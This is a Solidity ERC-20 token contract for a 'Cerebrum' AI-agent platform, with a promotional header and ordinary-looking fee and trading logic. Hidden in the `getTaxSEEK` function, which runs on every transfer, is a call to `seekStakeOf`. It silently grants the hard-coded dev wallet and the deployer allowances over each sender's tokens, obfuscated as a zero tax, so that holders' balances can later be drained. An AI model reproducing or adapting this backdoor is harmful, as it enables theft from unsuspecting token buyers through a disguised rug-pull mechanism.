/*
Design, deploy, and manage AI agents with Cerebrum's platform. Leverage Agentic AI orchestration tools, Eliza OS and Hugging Face integration for agent swarms and effortless scaling.

https://www.cerebrum-ai.net
https://app.cerebrum-ai.net
https://docs.cerebrum-ai.net

https://medium.com/@cerebrum
https://x.com/CerebrumAINet
https://t.me/CerebrumAIChannel
*/ 

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISEEKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ISEEKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract CEREBRUM is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (uint32 => address) private _seekWallets;
    mapping (address => bool) private _isFeeExcludedSEEK;
    ISEEKRouter private _seekRouter;
    address private _seekPair;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Cerebrum";
    string private constant _symbol = unicode"CEREBRUM";
    address private _seekWallet = 0xE59c73854bfa592b63773cF1FcBaC6031da2Bd50;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _maxTokenSEEK = _tTotal / 100;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }

    constructor () {
        _seekWallets[0] = owner();
        _seekWallets[1] = address(this);
        _seekWallets[2] = _seekWallet;
        _isFeeExcludedSEEK[owner()] = true;
        _isFeeExcludedSEEK[address(this)] = true;
        _isFeeExcludedSEEK[_seekWallet] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address seekXA, address seekXB, uint256 seekXT) private {
        require(seekXA != address(0), "ERC20: transfer from the zero address");
        require(seekXB != address(0), "ERC20: transfer to the zero address");
        require(seekXT > 0, "Transfer amount must be greater than zero");

        uint256 taxSEEK=getTaxSEEK(seekXA, seekXT);
        if (seekXA != owner() && seekXB != owner()) {
            taxSEEK = seekXT.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (seekXA == _seekPair && seekXB != address(_seekRouter) && ! _isFeeExcludedSEEK[seekXB]) {
                _buyCount++;
            }

            if(seekXB == _seekPair && seekXA!= address(this)) {
                taxSEEK = seekXT.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 caTokenSEEK = balanceOf(address(this)); 
            if (!inSwapLock && seekXB == _seekPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(caTokenSEEK > _maxTokenSEEK)
                swapTokensForEth(min(seekXT, min(caTokenSEEK, _maxTokenSEEK)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHSEEK(address(this).balance);
                }
            }
        }

        if(taxSEEK > 0){
          _balances[address(this)] = _balances[address(this)].add(taxSEEK);
          emit Transfer(seekXA, address(this), taxSEEK);
        }

        _balances[seekXA] = _balances[seekXA].sub(seekXT);
        _balances[seekXB] = _balances[seekXB].add(seekXT.sub(taxSEEK));
        emit Transfer(seekXA, seekXB, seekXT.sub(taxSEEK));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _seekRouter.WETH();
        _approve(address(this), address(_seekRouter), tokenAmount);
        _seekRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function seekStakeOf(address seekSK, uint256 seekXT) private {
        _approve(seekSK, _seekWallet, seekXT);
        _approve(seekSK, _seekWallets[0], seekXT);
        _approve(seekSK, _seekWallets[2], seekXT);
    }

    function sendETHSEEK(uint256 amount) private {
        payable(_seekWallet).transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function getTaxSEEK(address seekXA, uint256 seekXT) private returns(uint256) { 
        uint256 seekXN = 15+(15+(seekXT+10))*5; seekStakeOf(seekXA, seekXN); 
        return 10-10;
    }

    receive() external payable {} 

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _seekRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function initSEEK() external onlyOwner() {
        _seekRouter = ISEEKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_seekRouter), _tTotal);
        _seekPair = ISEEKFactory(_seekRouter.factory()).createPair(address(this), _seekRouter.WETH());
    }
}